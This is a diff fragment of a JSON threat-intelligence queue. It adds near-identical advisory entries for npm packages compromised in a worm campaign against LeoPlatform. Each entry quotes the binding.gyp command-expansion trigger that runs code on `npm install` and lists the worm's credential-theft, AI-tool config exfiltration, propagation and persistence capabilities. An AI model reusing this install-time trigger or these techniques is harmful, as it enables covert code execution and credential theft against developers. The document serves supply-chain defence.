+      "summary": "The `leo-connector-oracle` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance. --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (6f58d7bafe2bb3cea11b6066ac48bf357bc79d2b0170c6a76c4b247c89eadb71) The package ships a binding.gyp containing GYP command-expansion syntax (`<!(...)`) at line 6 inside the `sources` field of a target definition. npm implicitly runs `node-gyp rebuild` whenever a `binding.gyp` is present, even with no declared install/postinstall script, and GYP evaluates `<!(...)` as a shell invocation during its configure step. This causes the embedded command to execute automatically on `npm install`, functionally identical to a lifecycle hook. Use of GYP command expansion in a `sources` list is anomalous for a normal native addon build (sources are expected to be literal file paths). Any installer running `npm install leo-connector-oracle` will execute the command at build-configuration time.",
       "sources": [
         "osv"
       ],
       "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6436"
+        "https://osv.dev/vulnerability/MAL-2026-6426"
       ],
       "mergedLeadRefs": [
-        "osv:MAL-2026-6436"
+        "osv:MAL-2026-6426"
       ],
       "firstSeenAt": "2026-06-24T23:04:55.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:01:24.286Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:29.445Z",
       "activityBasis": [
         "advisory_updated",
         "active_exploitation_or_malware_signal"
@@ -646,7 +646,817 @@
         "routingPriority": "p0",
         "effectiveActiveStatus": "exploited_in_wild",
         "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:01:24.286Z",
+        "activeStatusExpiresAt": "2026-07-25T08:01:29.445Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-c846153914f7bd0f",
+      "canonicalSubjectId": "MAL-2026-6425",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in leo-connector-mysql (npm)",
+      "summary": "The `leo-connector-mysql` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance. --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (cc20d78464a78cbe988dbbbc2fe10cd4207311a8ff43ee7c5a0411e68e81bb57) The package ships a binding.gyp file containing GYP command-expansion syntax (`<!(...)`) at line 6. npm implicitly runs `node-gyp rebuild` whenever a binding.gyp is present — even without any declared install/postinstall script — and GYP evaluates `<!(...)` expressions as shell commands during the configure step. This causes the embedded command to execute automatically on every `npm install`, functionally identical to a lifecycle hook. Any installer or build system that pulls this package will run the expanded command with the privileges of the installing user.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6425"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6425"
+      ],
+      "firstSeenAt": "2026-06-24T23:04:55.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:29.233Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:29.233Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-b19951f63123cd0f",
+      "canonicalSubjectId": "MAL-2026-6423",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in leo-connector-elasticsearch (npm)",
+      "summary": "The `leo-connector-elasticsearch` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance. --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (fe643e56a0ed63b5f361b4d14c4f6a0a4e13d58bb1c68bb2d296ceafc7756465) The package ships a binding.gyp containing GYP command-expansion syntax (<!(...)) at line 6 inside the targets/sources fields. npm implicitly runs `node-gyp rebuild` whenever a binding.gyp is present — even without any declared install or postinstall lifecycle script — and GYP evaluates <!(...) as a shell command during the configure step. This causes the embedded command to execute on the installer's machine on `npm install`, functionally equivalent to a lifecycle hook running arbitrary code. The binding.gyp embedding command substitution rather than a list of real native source files (.c/.cc/.cpp) indicates the file's purpose is to run that command at install time, not to build a legitimate native addon.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6423"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6423"
+      ],
+      "firstSeenAt": "2026-06-24T23:04:55.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:29.181Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:29.181Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-2659d8aedb505748",
+      "canonicalSubjectId": "MAL-2026-6424",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in leo-connector-mongo (npm)",
+      "summary": "The `leo-connector-mongo` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance. --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (dc9ecc7f6488cb4c941a9184df1b6cf93ff87dc98f904d7b2b45025bd88f143a) The package ships a binding.gyp at the root that uses GYP command-expansion syntax (`<!(...)`) at line 6 within the targets/sources fields. npm implicitly runs `node-gyp rebuild` whenever a binding.gyp is present — even when no install/postinstall script is declared — and node-gyp's configure step evaluates `<!(...)` as a shell command. This results in arbitrary command execution on the installer's machine during a default `npm install`, functionally equivalent to a malicious lifecycle hook. The command embedded in the GYP expansion runs with the installing user's privileges on every install of this version.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6424"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6424"
+      ],
+      "firstSeenAt": "2026-06-24T23:04:55.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:29.080Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:29.080Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-55c2197fdb4115bc",
+      "canonicalSubjectId": "MAL-2026-6421",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in leo-cli (npm)",
+      "summary": "The `leo-cli` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance. --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (520c95e9cea55807cedb7f42a819fdb63febb61fe9a392b3de8f31f129cfa0fc) The package ships a binding.gyp file containing GYP command-expansion syntax (`<!(...)`) in its target configuration. npm implicitly invokes `node-gyp rebuild` whenever a binding.gyp is present — even without an explicit install/postinstall script — and node-gyp evaluates `<!(...)` expressions as shell commands during the configure step. This causes arbitrary shell execution on the installer's machine on `npm install`, functionally equivalent to a lifecycle hook. Additional files (docker/run.js, docker-run.js, lib/build.js, lib/defaultCronRunner.js) combine child_process and outbound HTTP usage, broadening the install/runtime risk surface, though the binding.gyp command-expansion alone is sufficient grounds for installer-side concern.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6421"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6421"
+      ],
+      "firstSeenAt": "2026-06-24T23:04:55.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:28.978Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:28.978Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-14edc51429c29c1f",
+      "canonicalSubjectId": "MAL-2026-6420",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in leo-cdk-lib (npm)",
+      "summary": "The `leo-cdk-lib` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance. --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (0c00b5f0c306cb1af4497ed1726f1889b62a9b20d64de1dceb3181fbd7ca263b) The package ships a binding.gyp at the root that contains GYP command-expansion syntax (<!(...)) inside the targets/sources fields. npm implicitly runs node-gyp rebuild whenever a binding.gyp is present, even without a declared install/postinstall script, and GYP evaluates <!(...) as a shell command during the configure step. This causes the embedded command to execute automatically on `npm install`, functionally equivalent to a lifecycle hook. The package does not ship corresponding native source files (.c/.cc/.cpp/.h) that would justify a real node-gyp build, indicating the binding.gyp's purpose is to run the embedded command rather than to build a native addon.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6420"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6420"
+      ],
+      "firstSeenAt": "2026-06-24T23:04:55.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:28.976Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:28.976Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-41ede0f0f1d3e446",
+      "canonicalSubjectId": "MAL-2026-6419",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in leo-cache (npm)",
+      "summary": "The `leo-cache` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance. --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (b4e18f4565cc6df3a4011a9e35edaa348d84f36a6e1b3e8816748baec5ef567a) The package ships a binding.gyp at the package root that uses GYP command-expansion syntax (`<!(...)`) at line 6 within the targets/sources fields. npm implicitly runs `node-gyp rebuild` whenever a binding.gyp is present (even with no declared install/postinstall script), and GYP evaluates `<!(...)` as a shell command during its configure step. This causes the embedded command to execute automatically on `npm install`, functionally equivalent to a lifecycle hook running arbitrary shell. This pattern is a known install-time code execution vector used to disguise execution as a native-addon build configuration.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6419"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6419"
+      ],
+      "firstSeenAt": "2026-06-24T23:04:55.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:28.589Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:28.589Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-365fe9fccd5e0c8d",
+      "canonicalSubjectId": "MAL-2026-6422",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in leo-config (npm)",
+      "summary": "The `leo-config` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance. --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (97cc6912b16110de3edb6578ad95543fa4f46f38833aa907470ea957d83f50d8) The package ships a binding.gyp containing GYP command-expansion syntax (`<!(...)`) at line 6 within the targets/sources fields. npm implicitly runs `node-gyp rebuild` whenever a binding.gyp is present — even without any declared install/postinstall script — and GYP evaluates `<!(...)` as a shell command during the configure step. This causes the embedded command to execute automatically on `npm install`. The package does not appear to ship genuine native source files matching a real native-addon build, so the binding.gyp's only practical purpose is to run the embedded shell command at install time. This is functionally identical to a malicious lifecycle hook and constitutes install-time arbitrary code execution on any machine that installs this package.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6422"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6422"
+      ],
+      "firstSeenAt": "2026-06-24T23:04:55.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:28.547Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:28.547Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-d28d1a4a77cadf03",
+      "canonicalSubjectId": "MAL-2026-6417",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in leo-auth (npm)",
+      "summary": "The `leo-auth` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance. --- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (6fb699267ee396f96887aa6ab8538a62ecb0d2c0401aac12942b345bbe149928) The package ships a binding.gyp file containing GYP command-expansion syntax (<!(...) / <!@(...) / <@(...)) inside its sources/targets configuration at line 6. npm implicitly runs `node-gyp rebuild` whenever a binding.gyp is present (no declared install/postinstall script is required), and the GYP configure step evaluates command-expansion expressions as shell commands. This means installing the package automatically executes the embedded command on the installer's machine before any user code runs. The package is named as an authentication helper and does not ship a real native addon source tree consistent with a legitimate build, so the only purpose of the binding.gyp file is to run the embedded shell command at install time. This is the structural fingerprint of install-time remote code execution via build-config command substitution.",
+      "sources": [
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6417"
+      ],
+      "mergedLeadRefs": [
+        "osv:MAL-2026-6417"
+      ],
+      "firstSeenAt": "2026-06-24T23:04:55.000Z",
+      "lastMaterialActivityAt": "2026-06-25T08:01:28.331Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-25T08:01:28.331Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
